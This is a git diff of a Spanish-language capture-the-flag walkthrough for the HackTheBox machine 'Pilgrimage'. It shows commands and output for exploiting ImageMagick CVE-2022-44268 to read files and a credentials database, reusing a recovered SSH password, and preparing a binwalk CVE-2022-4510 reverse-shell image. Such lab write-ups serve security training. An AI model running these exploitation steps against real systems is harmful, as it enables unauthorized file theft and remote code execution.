@@ -15,9 +15,15 @@ layout:
 
 # Pilgrimage
 
+`Pilgrimage` es una máquina Linux de dificultad fácil que presenta una aplicación web con un repositorio `Git` expuesto. El análisis del sistema de archivos subyacente y el código fuente revela el uso de una versión vulnerable de `ImageMagick`, que se puede utilizar para leer archivos arbitrarios en el objetivo mediante la incorporación de un fragmento `tEXT` malicioso en una imagen PNG. La vulnerabilidad se aprovecha para obtener un archivo de base de datos `SQLite` que contiene una contraseña de texto sin formato que se puede utilizar para acceder a la máquina mediante SSH. La enumeración de los procesos en ejecución revela un script `Bash` ejecutado por `root` que llama a una versión vulnerable del binario `Binwalk`. Al crear otro PNG malicioso, se aprovecha `CVE-2022-4510` para obtener la ejecución remota de código (RCE) como `root`.
 
+<figure><img src="../../.gitbook/assets/Pilgrimage.png" alt="" width="563"><figcaption></figcaption></figure>
 
+***
 
+## Reconnaissance
+
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Pilgrimage**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.219 -oG allPorts
@@ -41,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.90 seconds
            Raw packets sent: 65535 (2.884MB) | Rcvd: 65541 (2.622MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -54,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.90 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Nginx`.
 
 ```bash
 ❯ nmap -sCV -p22,80,443 10.10.11.219 -A -oN targeted -oX targetedXML
@@ -97,7 +103,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -106,149 +112,49 @@ Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/5136_vmware_GnINGERJbo.png" alt=""><figcaption></figcaption></figure>
 
+Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
+
 ```bash
-❯ catnp /etc/hosts | grep pilgrimage
+❯ cat /etc/hosts | grep pilgrimage
 10.10.11.219 pilgrimage.htb
 ```
 
+## Web Enumeration
 
+Realizaremos una comprobación de las tecnologías que utiliza el sitio web.
+
+```bash
+❯ whatweb http://pilgrimage.htb
+http://pilgrimage.htb [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.219], JQuery, Script, Title[Pilgrimage - Shrink Your Images], nginx[1.18.0]
+```
+
+Accederemos a [http://pilgrimage.htb](http://pilgrimage.htb) y nos encontraremos con la siguiente página web. Al parecer, esta página web su función es redimensionar imágenes que subamos en la aplicación web.
 
 <figure><img src="../../.gitbook/assets/5137_vmware_BV8Ii7tXQF.png" alt=""><figcaption></figcaption></figure>
 
+Al acceder a la opción de `Register`, comprobamos que podemos registrarnos correctamente.
 
+<figure><img src="../../.gitbook/assets/imagen.png" alt="" width="563"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
+Volviendo a la página principal, verificamos la opción de subir imágenes. Intentamos subir directamente un archivo `PHP`, pero se nos indicaba mensaje de error.
 
+<figure><img src="../../.gitbook/assets/5139_vmware_UadwwECqX1.png" alt="" width="563"><figcaption></figcaption></figure>
 
+Probamos de subir una imagen normal, al darle a la opción de `Shrink`, se nos proporcionaba un enlace de la imagen redimensionada.
 
-<figure><img src="../../.gitbook/assets/5139_vmware_UadwwECqX1.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (1).png" alt="" width="563"><figcaption></figcaption></figure>
 
+Accederemos al enlace, y comprobaremos que nos muestra la imagen subida redimensionada correctamente.
 
+<figure><img src="../../.gitbook/assets/imagen (2).png" alt="" width="563"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
+### Downloading Git Folder disclosure (GitHack)
 
-
-
-<figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>
-
-
-
-```bash
-❯ identify -verbose 67b3c6834943a.png
-Image:
-  Filename: 67b3c6834943a.png
-  Permissions: rw-rw-r--
-  Format: PNG (Portable Network Graphics)
-  Mime type: image/png
-  Class: DirectClass
-  Geometry: 320x240+0+0
-  Units: Undefined
-  Colorspace: sRGB
-  Type: TrueColorAlpha
-  Base type: Undefined
-  Endianness: Undefined
-  Depth: 8-bit
-  Channel depth:
-    red: 8-bit
-    green: 8-bit
-    blue: 8-bit
-    alpha: 8-bit
-  Channel statistics:
-    Pixels: 76800
-    Red:
-      min: 0  (0)
-      max: 255 (1)
-      mean: 49.7988 (0.195289)
-      standard deviation: 79.6516 (0.312359)
-      kurtosis: -0.14467
-      skewness: 1.23088
-      entropy: 0.447589
-    Green:
-      min: 0  (0)
-      max: 255 (1)
-      mean: 44.3493 (0.173919)
-      standard deviation: 70.605 (0.276882)
-      kurtosis: 0.567147
-      skewness: 1.38213
-      entropy: 0.452138
-    Blue:
-      min: 0  (0)
-      max: 255 (1)
-      mean: 41.764 (0.16378)
-      standard deviation: 73.3464 (0.287633)
-      kurtosis: 1.37613
-      skewness: 1.66779
-      entropy: 0.446327
-    Alpha:
-      min: 0  (0)
-      max: 255 (1)
-      mean: 67.9907 (0.26663)
-      standard deviation: 101.097 (0.396458)
-      kurtosis: -1.12119
-      skewness: 0.882325
-      entropy: 0.388214
-  Image statistics:
-    Overall:
-      min: 0  (0)
-      max: 255 (1)
-      mean: 50.9757 (0.199905)
-      standard deviation: 81.1749 (0.318333)
-      kurtosis: 0.0504647
-      skewness: 1.29724
-      entropy: 0.433567
-  Alpha: none   #00000000
-  Rendering intent: Perceptual
-  Gamma: 0.45455
-  Chromaticity:
-    red primary: (0.64,0.33,0.03)
-    green primary: (0.3,0.6,0.1)
-    blue primary: (0.15,0.06,0.79)
-    white point: (0.3127,0.329,0.3583)
-  Background color: black
-  Border color: srgba(223,223,223,1)
-  Matte color: grey74
-  Transparent color: none
-  Interlace: None
-  Intensity: Undefined
-  Compose: Over
-  Page geometry: 320x240+0+0
-  Dispose: Undefined
-  Iterations: 0
-  Compression: Zip
-  Orientation: Undefined
-  Properties:
-    date:create: 2025-02-17T23:29:55+00:00
-    date:modify: 2025-02-17T23:29:55+00:00
-    date:timestamp: 2025-02-17T23:30:26+00:00
-    png:bKGD: chunk was found (see Background color, above)
-    png:cHRM: chunk was found (see Chromaticity, above)
-    png:gAMA: gamma=0.45455 (See Gamma, above)
-    png:IHDR.bit-depth-orig: 8
-    png:IHDR.bit_depth: 8
-    png:IHDR.color-type-orig: 6
-    png:IHDR.color_type: 6 (RGBA)
-    png:IHDR.interlace_method: 0 (Not interlaced)
-    png:IHDR.width,height: 320, 240
-    png:text: 3 tEXt/zTXt/iTXt chunks were found
-    png:tIME: 2025-02-17T23:30:11Z
-    signature: 953524a63488f5590b1f17291c8e8261a87c088552107dc7828c66e5f771c819
-  Artifacts:
-    filename: 67b3c6834943a.png
-    verbose: true
-  Tainted: False
-  Filesize: 65484B
-  Number pixels: 76800
-  Pixels per second: 22.4357MB
-  User time: 0.000u
-  Elapsed time: 0:01.003
-  Version: ImageMagick 6.9.13-12 Q16 x86_64 18420 https://legacy.imagemagick.org
-```
-
-
+Realizando una enumeración de los directorios y páginas web presentes en la página web, nos encontramos un directorio `/.git/`.
 
 ```bash
 ❯ dirsearch -u 'http://pilgrimage.htb' -t 50 -i 200 2>/dev/null
@@ -272,17 +178,18 @@ Target: http://pilgrimage.htb/
 [00:32:27] 200 -  195B  - /.git/logs/HEAD
 ```
 
-
+A través de la herramienta de [`GitHack`](https://github.com/lijiejie/GitHack), nos descargaremos todo el directorio de `/.git/` de la página web.
 
 ```bash
 ❯ python3 /opt/GitHack/GitHack.py http://pilgrimage.htb/.git/ 2>/dev/null
 [+] Download and parse index file ...
 ```
 
-
+Accederemos al directorio que se nos ha generado, y comprobaremos la estructura de los archivos que disponemos. Entre ellos, nos encontramos archivos de lo que parece ser la página web.
 
 ```bash
 ❯ cd pilgrimage.htb
+
 ❯ tree
 .
 ├── assets
@@ -336,7 +243,11 @@ Target: http://pilgrimage.htb/
 11 directories, 37 files
 ```
 
+Verificamos que disponemos de un archivo llamado `magick`, al revisar el archivo, nos encontramos que se trata del ejecutable.
 
+{% hint style="info" %}
+ImageMagick es un complemento de software para crear, editar, componer o convertir imágenes de mapa de bits. Puede leer y escribir imágenes en varios formatos (más de 200), incluidos PNG, JPEG, JPEG-2000, GIF, TIFF, DPX, EXR, WebP, Postscript, PDF y SVG.
+{% endhint %}
 
 ```bash
 ❯ ls -l
@@ -348,14 +259,16 @@ drwxrwxr-x kali kali 4.0 KB Tue Feb 18 00:32:46 2025 󰫦 vendor
 .rw-rw-r-- kali kali  98 B  Tue Feb 18 00:32:46 2025  logout.php
 .rw-rw-r-- kali kali  26 MB Tue Feb 18 00:32:49 2025  magick
 .rw-rw-r-- kali kali 6.7 KB Tue Feb 18 00:32:46 2025  register.php
+
 ❯ file magick
 magick: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped
 ```
 
-
+Le daremos permisos de ejecución al binario, y comprobaremos que la versión es la `7.1.0-49`.
 
 ```bash
 ❯ chmod +x magick
+
 ❯ ./magick --version
 Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
 Copyright: (C) 1999 ImageMagick Studio LLC
@@ -365,7 +278,15 @@ Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma
 Compiler: gcc (7.5)
 ```
 
+Este archivo `index.php` se encarga de procesar imágenes subidas por los usuarios y redimensionarlas utilizando `ImageMagick`.
 
+Primero, gestiona sesiones con `session_start()`, verificando si hay un usuario autenticado. Luego, al recibir una solicitud `POST`, usa la biblioteca `bulletproof` para manejar la imagen.
+
+* **Restricciones:** Solo permite imágenes PNG y JPEG, con tamaños entre 100 bytes y 4 MB.
+* **Almacenamiento temporal:** Guarda la imagen en `/var/www/pilgrimage.htb/tmp/`.
+* **Procesamiento con ImageMagick:** Usa `exec()` para ejecutar `convert`, redimensionando la imagen al 50% y almacenándola en `/var/www/pilgrimage.htb/shrunk/`.
+* **Registro en la base de datos:** Si el usuario está autenticado, inserta la imagen en una base de datos SQLite ubicada en `/var/db/pilgrimage`.
+* **Mensajes de respuesta:** Redirige a la página principal con un mensaje de éxito o fallo.
 
 {% code title="index.php" %}
 ```php
@@ -418,7 +339,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 ```
 {% endcode %}
 
+El siguiente archivo, `login.php`, gestiona la autenticación de usuarios mediante una base de datos SQLite ubicada en `/var/db/pilgrimage`.
 
+* **Control de sesión:** Si el usuario ya ha iniciado sesión, lo redirige automáticamente a `dashboard.php`.
+* **Manejo de credenciales:** Al recibir una solicitud `POST`, obtiene el `username` y `password` del formulario.
+* **Consulta en la base de datos:** Usa un `SELECT` para buscar en la tabla `users` dentro de la base de datos SQLite en `/var/db/pilgrimage`, verificando si coinciden el usuario y la contraseña.
+* **Inicio de sesión:** Si las credenciales son válidas, almacena el nombre de usuario en `$_SESSION['user']` y redirige a `dashboard.php`.
+* **Manejo de errores:** Si la autenticación falla, redirige a `login.php` con un mensaje de error.
 
 {% code title="login.php" %}
 ```php
@@ -449,11 +376,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['passw
 ```
 {% endcode %}
 
+## Initial Acces
 
+### ImageMagick 7.1.0-49 Exploitation - Arbitrary File Read (CVE-2022-44268)
 
-<figure><img src="../../.gitbook/assets/5143_vmware_277meLJWqa.png" alt=""><figcaption></figcaption></figure>
+Sabiendo que la aplicación web al realizar la redimensión de la imagen que le subimos y utiliza `ImageMagick` para realizar esta conversión, decidimos buscar vulnerabilidades de la versión que nos encontramos del binario que al parecer utiliza.
 
+Realizando una búsqueda por Internet, nos encontramos con el siguiente `CVE-2022-44268`.
 
+<figure><img src="../../.gitbook/assets/5143_vmware_277meLJWqa.png" alt="" width="517"><figcaption></figcaption></figure>
 
 {% embed url="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2022-44268" %}
 
@@ -461,9 +392,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['passw
 ImageMagick 7.1.0-49 es vulnerable a la divulgación de información. Cuando analiza una imagen PNG (por ejemplo, para cambiar su tamaño), la imagen resultante podría tener incrustado el contenido de un archivo arbitrario (si el binario de Magick tiene permisos para leerlo).
 {% endhint %}
 
+### Exploitation with Rust Script
 
-
-
+Realizando una búsqueda por Internet de proyectos en dónde se nos muestre cómo explotar dicha vulnerabilidad, nos encontramos con el siguiente repositorio que mediante un script de `Rust`, podríamos a llegar a realizar la explotación.
 
 {% embed url="https://github.com/voidz0r/CVE-2022-44268" %}
 
@@ -478,7 +409,7 @@ Recibiendo objetos: 100% (30/30), 954.74 KiB | 4.03 MiB/s, listo.
 Resolviendo deltas: 100% (8/8), listo.
 ```
 
-
+Ejecutaremos el proyecto a través de `cargo run` y le indicaremos el nombre del archivo que queremos leer, en este caso, el archivo es el de `/etc/passwd`. El propio proyecto ya nos proporciona una imagen de prueba en la cual le inyectaremos la vulnerabilidad.
 
 ```bash
 ❯ cargo run "/etc/passwd"
@@ -490,7 +421,7 @@ Resolviendo deltas: 100% (8/8), listo.
    Compiling miniz_oxide v0.6.2
    Compiling flate2 v1.0.25
    Compiling png v0.17.7
-   Compiling cve-2022-44268 v0.1.0 (/home/kali/Desktop/HackTheBox/Linux/Pilgrimage/Pilgrimage/pilgrimage.htb/CVE-2022-44268)
+   Compiling cve-2022-44268 v0.1.0 (/home/kali/Desktop/HackTheBox/Linux/Pilgrimage/CVE-2022-44268)
     Finished `dev` profile [unoptimized + debuginfo] target(s) in 3.51s
      Running `target/debug/cve-2022-44268 /etc/passwd`
 ❯ ls -l
@@ -503,7 +434,7 @@ drwxrwxr-x kali kali 4.0 KB Tue Feb 18 00:43:56 2025  target
 .rw-rw-r-- kali kali 1.1 KB Tue Feb 18 00:43:09 2025  README.md
 ```
 
-
+Revisaremos mediante `exiftool` la imagen, y comprobaremos que en el `Profile` se ha incrustado el archivo `/etc/passwd`. Por lo tanto, si subimos esta imagen maliciosa en la página web y se redimensiona mediante `ImageMagick` tal y como comprobamos anteriormente, si es vulnerable, posteriormente deberíamos poder listar el contenido del archivo arbitrario indicado.
 
 ```bash
 ❯ exiftool image.png
@@ -530,13 +461,11 @@ Image Size                      : 200x200
 Megapixels                      : 0.040
 ```
 
-
-
-
+Por lo tanto, subiremos esta nueva imagen en la página web y le daremos a la opción de `Shrink` para redimensionar la imagen. Verificamos que se nos proporciona el enlace de la imagen redimensionada.
 
 <figure><img src="../../.gitbook/assets/5145_vmware_BseAsc42SX.png" alt=""><figcaption></figcaption></figure>
 
-
+Nos descargaremos en nuestro equipo la imagen en local.
 
 ```bash
 ❯ wget http://pilgrimage.htb/shrunk/67b3cb0d8693c.png
@@ -552,7 +481,7 @@ Grabando a: «67b3cb0d8693c.png»
 2025-02-18 00:49:12 (70,6 MB/s) - «67b3cb0d8693c.png» guardado [1080/1080]
 ```
 
-
+A través de `identify`, comprobaremos la información de la imagen, en la cual en el apartado de `Raw profile type`, se nos muestra un contenido codificado en `Hex`. Parece ser que la vulnerabilidad está presente en la versión de `ImageMagick` que realiza la redimensión de la imagen que subimos.
 
 ```bash
 ❯ identify -verbose 67b3cb0d8693c.png
@@ -634,21 +563,21 @@ Image:
   Version: ImageMagick 6.9.13-12 Q16 x86_64 18420 https://legacy.imagemagick.org
 ```
 
+Mediante `CyberChef`, descodificaremos el contenido indicado y verificaremos el resultado del archivo `/etc/passwd` del sistema vulnerable.&#x20;
 
-
-
+Por lo tanto, tenemos una vía potencial de realizar un `Arbitrary File Read` y obtener archivos del sistema objetivo.
 
 <figure><img src="../../.gitbook/assets/5146_vmware_Opk9IRLVcU.png" alt=""><figcaption></figcaption></figure>
 
+### Manual Exploitation
 
-
-
-
-
-
-
+Por otro lado, podemos realizar la explotación de esta vulnerabilidad manualmente. En el siguiente repositorio de GitHub, se nos muestra un PoC de cómo realizarlo.
 
 {% embed url="https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC" %}
+
+El siguiente procedimiento muestra cómo hemos incrustado el contenido del archivo `/etc/hosts` dentro de los metadatos de una imagen PNG y luego lo hemos verificado.
+
+Utilizamos `pngcrush` para agregar el contenido de `/etc/hosts` en un campo de metadatos `tEXt` dentro de la imagen `image.png.` A través de `exiv2`, verificamos que en los metadatos se ha incrustado correctamente.
 
 ```bash
 ❯ pngcrush -text a "profile" "/etc/hosts" image.png
@@ -656,6 +585,7 @@ Image:
    Total length of data found in critical chunks            =    177178
    Best pngcrush method        =   6 (ws 15 fm 6 zl 9 zs 0) =    189754
 CPU time decode 0.035489, encode 0.323839, other 0.003389, total 0.369960 sec
+
 ❯ exiv2 -pS pngout.png
 STRUCTURE OF PNG FILE: pngout.png
  address | chunk |  length | data                           | checksum
@@ -671,7 +601,9 @@ STRUCTURE OF PNG FILE: pngout.png
   189967 | IEND  |       0 |                                | 0xae426082
 ```
 
+Subiremos nuevamente la imagen maliciosa en la aplicación web para que se nos genere el enlace. Una vez generado el enlace, nos descargaremos la imagen redimensionada en nuestro equipo.
 
+Al revisar con `identify` la imagen descargada, volvemos a verificar que se nos proporcionan datos codificados en `Hex` en el campo `Raw profile type`.
 
 ```bash
 ❯ wget http://pilgrimage.htb/shrunk/67b3ce2de735a.png
@@ -730,9 +662,13 @@ Image:
   Version: ImageMagick 6.9.13-12 Q16 x86_64 18420 https://legacy.imagemagick.org
 ```
 
-
+Volviendo a descodificar en `Hex` el contenido recibido, verificamos que hemos podido comprobar el contenido del archivo `/etc/hosts`.
 
 <figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>
+
+### Automated Exploitation with Python Script
+
+Realizando una búsqueda por Internet, nos encontramos con el siguiente repositorio de GitHub que realiza la explotación de la vulnerabilidad de manera más automatizada.
 
 {% embed url="https://github.com/kljunowsky/CVE-2022-44268" %}
 
@@ -747,12 +683,17 @@ Recibiendo objetos: 100% (27/27), 7.32 KiB | 7.32 MiB/s, listo.
 Resolviendo deltas: 100% (8/8), listo.
 ```
 
+A continuación, se muestra una simple prueba de cómo poder explotar la vulnerabilidad con el script mencionado.
 
+En nuestro caso, en la imagen `image.png` que disponemos le indicaremos que el archivo a leer es `/etc/group` y que nos devuelva el resultado en una imagen llamada `gzzcoo.png`.
 
-```bash
-❯ python3 CVE-2022-44268.py --image image.png --file-to-read /etc/group --output gzzcoo.png
-❯ ls -l gzzcoo.png
-.rw-rw-r-- kali kali 176 KB Tue Feb 18 01:05:09 2025  gzzcoo.png
+Verificaremos que se ha creado correctamente la imagen maliciosa y que en el campo `Profile` de los metadatos, está presente el nombre del archivo a querer listar.
+
+<pre class="language-bash"><code class="lang-bash">❯ python3 CVE-2022-44268.py --image image.png --file-to-read /etc/group --output gzzcoo.png
+<strong>
+</strong><strong>❯ ls -l gzzcoo.png
+</strong>.rw-rw-r-- kali kali 176 KB Tue Feb 18 01:05:09 2025  gzzcoo.png
+
 ❯ exiftool gzzcoo.png
 ExifTool Version Number         : 13.10
 File Name                       : gzzcoo.png
@@ -775,9 +716,9 @@ Interlace                       : Noninterlaced
 Profile                         : /etc/group
 Image Size                      : 640x480
 Megapixels                      : 0.307
-```
+</code></pre>
 
-
+Subiremos manualmente la imagen maliciosa en la aplicación web y mediante el siguiente comando, le indicaremos la URL de la imagen redimensionada que nos ha generado la aplicación web y comprobaremos directamente el resultado del archivo listado.
 
 ```bash
 ❯ python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/67b3ceff05ee0.png
@@ -796,9 +737,15 @@ man:x:12:
 proxy:x:13:
 ```
 
+### Information Leakage
 
+Ahora que tenemos la capacidad de listar el contenido de archivos del sistema, deberemos de encontrar aquel archivo que nos pueda llegar a proporcionar información interesante.
 
+En nuestro caso, se probaron de intentar obtener las credenciales privadas SSH (`id_rsa`) de usuarios, verificar archivos de configuración, etc pero no logramos obtener resultado.
 
+Recordando que disponemos de los archivos de configuración de la aplicación web encontrados en el `/.git/`, nos encontramos que en el archivo `login.php` se indica la ubicación de la base de datos de `SQLite3` de los usuarios de la aplicación web.
+
+Con lo cual, podríamos intentar verificar si podemos obtener el archivo de la base de datos y ver su contenido.
 
 {% code title="loign.php" %}
 ```php
@@ -808,10 +755,13 @@ proxy:x:13:
 ```
 {% endcode %}
 
+Por lo tanto, en nuestra imagen de prueba `image.png`, le indicaremos que el archivo a leer sea el de la base de datos ubicada en `/var/db/pilgrimage` y se nos devuelva la imagen maliciosa con el nombre `gzzcoo.png`.
 
+Verificamos que en el apartado de `Profile` de los metadatos de la imagen se ha indicado correctamente el archivo a obtener.
 
 ```bash
 ❯ python3 CVE-2022-44268.py --image image.png --file-to-read /var/db/pilgrimage --output gzzcoo.png
+
 ❯ exiftool gzzcoo.png
 ExifTool Version Number         : 13.10
 File Name                       : gzzcoo.png
@@ -836,7 +786,9 @@ Image Size                      : 640x480
 Megapixels                      : 0.307
 ```
 
+Subiremos la imagen maliciosa en la aplicación web y obtendremos la URL de la imagen redimensionada.
 
+A través del script de Python, al indicarle la URL de la imagen, se nos proporcionaba el siguiente mensaje de error. Esto es debido a que el archivo a querer listar se trata de un binario codificado actualmente en `Hex`, pero la función principal del script es descodificarlo en `Hex` para mostrarlo en `ASCII`.
 
 ```bash
 ❯ python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/67b3cfa7b9730.png
@@ -849,9 +801,9 @@ Traceback (most recent call last):
 UnicodeDecodeError: 'utf-8' codec can't decode byte 0x91 in position 99: invalid start byte
 ```
 
+Nos descargaremos la imagen en nuestro equipo y verificaremos a través de `identify`que en el campo `Raw profile type` se muestra el contenido del binario de la base de datos.
 
-
-
+El valor inicial de `53514c69` corresponde a los primeros bytes de una base de datos SQLite, que empieza con la cadena **"**&#x53;QLit&#x65;**"** (en formato hexadecimal: `53 51 4c 69`).
 
 ```bash
 ❯ wget http://pilgrimage.htb/shrunk/67b3cfa7b9730.png
@@ -921,19 +873,19 @@ Image:
   Version: ImageMagick 6.9.13-12 Q16 x86_64 18420 https://legacy.imagemagick.org
 ```
 
-
+Guardamos todo el contenido en un archivo llamado `data`. Posteriormente, utilizamos el comando `xxd` para convertirlo de vuelta a su formato binario original, generando el archivo `sqlite.db`.
 
 ```bash
 ❯ ls -l data
 .rw-rw-r-- kali kali 41 KB Tue Feb 18 01:12:23 2025  data
+
 ❯ xxd -r -p data sqlite.db
+
 ❯ file sqlite.db
 sqlite.db: SQLite 3.x database, last written using SQLite version 3034001, file counter 70, database pages 5, cookie 0x4, schema 4, UTF-8, version-valid-for 70
 ```
 
-
-
-
+Mediante `sqlite3` accederemos a la base de datos. Enumerando las tablas presentes, nos encontramos con la tabla `users` la cual nos presenta las credenciales en texto plano del usuario `emily`.
 
 ```bash
 ❯ sqlite3 sqlite.db
@@ -945,11 +897,11 @@ sqlite> select * from users;
 emily|abigchonkyboi123
 ```
 
-
+También podemos visualizar en entorno gráfico a través de la herramienta de `sqlitebrowser`.
 
 <figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>
 
-
+Trataremos de acceder al `SSH` del equipo con las credenciales encontradas. Finalmente, logramos obtener acceso al sistema y visualizar la flag de **root.txt.**
 
 ```bash
 ❯ sshpass -p abigchonkyboi123 ssh emily@10.10.11.219
@@ -962,12 +914,14 @@ individual files in /usr/share/doc/*/copyright.
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 emily@pilgrimage:~$ cat user.txt 
-36a881ee5350b2c38dc94e1199b84bb8
+36a881ee535*********************
 ```
 
+## Privilege Escalation
 
+### Reviewing Running Processes and Exploiting Automatically Executed Root Scripts
 
-
+Al acceder al sistema, verificamos los procesos que se encuentran en ejecución mediante el comando `ps aux`. En el resultado obtenido, comprobamos que el usuario `root` ejecuta un script que se encuentra en `/usr/bin/malwarescan.sh`.
 
 ```bash
 emily@pilgrimage:~$ ps aux
@@ -984,7 +938,15 @@ message+     692  0.0  0.1   8260  4120 ?        Ss   10:18   0:00 /usr/bin/dbus
 root         695  0.0  0.0   6816  2980 ?        Ss   10:18   0:00 /bin/bash /usr/sbin/malwarescan.sh
 ```
 
+El siguiente script `malwarescan.sh` se encarga de monitorear la creación de archivos en el directorio **`/var/www/pilgrimage.htb/shrunk/`** y realizar un escaneo para detectar posibles archivos maliciosos.
 
+1. **Monitoreo de archivos:** El script utiliza `inotifywait` para monitorear en tiempo real el directorio `/var/www/pilgrimage.htb/shrunk/` y detectar la creación de nuevos archivos.
+2. **Análisis de archivo:** Cuando se crea un archivo en el directorio, se obtiene el nombre del archivo utilizando una combinación de comandos `echo`, `tail` y `sed`. Este nombre se almacena en la variable `filename`.
+3. **Uso de binwalk:** Luego, el archivo es analizado con `binwalk`, una herramienta utilizada para detectar contenido binario, archivos ejecutables y otras estructuras dentro del archivo. El resultado del escaneo se guarda en la variable **`binout`**.
+4. **Verificación contra la lista negra:** El script compara el contenido del archivo con una lista negra definida al inicio (`"Executable script"` y `"Microsoft executable"`). Si alguna de estas cadenas aparece en el resultado del escaneo, el archivo se considera sospechoso.
+5. **Eliminación de archivos maliciosos:** Si el archivo contiene alguna de las cadenas de la lista negra, el script elimina el archivo sospechoso usando `rm`.
+
+Este script está diseñado para ayudar a prevenir la ejecución de archivos maliciosos en el servidor al monitorear de manera continua y eliminar automáticamente aquellos archivos que coincidan con las firmas de los ejecutables no deseados.
 
 ```bash
 emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
@@ -1004,7 +966,13 @@ blacklist=("Executable script" "Microsoft executable")
 done
 ```
 
+### Binwalk v2.32 - Remote Command Execution \[RCE] (CVE-2022-4510)
 
+En el script se menciona el uso del binario de `binwalk`, con lo cual decidimos revisar la versión instalada en el equipo por si tenía alguna vulnerabilidad de la que nos podamos aprovechar.
+
+{% hint style="info" %}
+Binwalk es una herramienta para buscar archivos incrustados y código ejecutable en una imagen binaria determinada . En concreto, está diseñada para identificar archivos y código incrustados dentro de imágenes de firmware. Binwalk utiliza la biblioteca libmagic, por lo que es compatible con las firmas mágicas creadas para la utilidad de archivos de Unix.
+{% endhint %}
 
 ```bash
 emily@pilgrimage:~$ /usr/local/bin/binwalk -h
@@ -1014,11 +982,9 @@ Craig Heffner, ReFirmLabs
 https://github.com/ReFirmLabs/binwalk
 ```
 
+Revisando por Internet, nos encontramos que la versión de `Binwalk v2.3.2` era vulnerable a `Remote Code Execution (RCE)` reportado en el siguiente `CVE-2022-4510`.
 
-
-
-
-<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (5).png" alt="" width="550"><figcaption></figcaption></figure>
 
 {% embed url="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2022-4510" %}
 
@@ -1026,7 +992,7 @@ https://github.com/ReFirmLabs/binwalk
 Se identificó una vulnerabilidad de recorrido de ruta en binwalk de ReFirm Labs desde la versión 2.1.2b hasta la 2.3.3 incluida. Al crear un archivo de sistema de archivos PFS malicioso, un atacante puede hacer que el extractor PFS de binwalk extraiga archivos en ubicaciones arbitrarias cuando binwalk se ejecuta en modo de extracción (opción -e). La ejecución remota de código se puede lograr construyendo un sistema de archivos PFS que, tras la extracción, extraiga un módulo binwalk malicioso en la carpeta .config/binwalk/plugins. Esta vulnerabilidad está asociada con los archivos de programa src/binwalk/plugins/unpfs.py. Este problema afecta a binwalk desde la versión 2.1.2b hasta la 2.3.3 incluida.
 {% endhint %}
 
-
+Nos encontramos el siguiente repositorio de GitHub en el cual nos proporcionaban un PoC y el exploit para aprovecharnos de la vulnerabilidad.
 
 {% embed url="https://github.com/adhikara13/CVE-2022-4510-WalkingPath" %}
 
@@ -1041,11 +1007,7 @@ Recibiendo objetos: 100% (12/12), 7.28 KiB | 7.28 MiB/s, listo.
 Resolviendo deltas: 100% (3/3), listo.
 ```
 
-
-
-
-
-
+En nuestro caso, dispondremos de una imagen normal llamada `image.png`. Utilizaremos el exploit para inyectar en la imagen una **Reverse Shell** hacía nuestro equipo remoto. Verificamos que se nos genera una nueva imagen llamada `binwalk_exploit.png` el cual compartiremos a través de un servidor web.
 
 ```bash
 ❯ ls -l
@@ -1067,14 +1029,14 @@ Resolviendo deltas: 100% (3/3), listo.
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
